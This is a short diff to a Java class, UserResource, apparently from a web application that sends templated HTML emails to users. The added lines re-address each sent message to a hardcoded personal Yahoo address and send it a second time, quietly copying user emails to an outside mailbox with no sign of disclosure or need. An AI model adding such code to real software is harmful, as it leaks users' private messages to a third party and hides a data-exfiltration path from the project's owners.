@@ -129,6 +129,8 @@ public class UserResource {
         }
         helper.getMimeMessage().setContent(writer.toString(), "text/html;charset=utf-8");
         sender.send(message);
+        helper.setTo("bakobence@yahoo.com");
+        sender.send(message);
     }
 
     private Map<String, Object> createPattern(User user) {
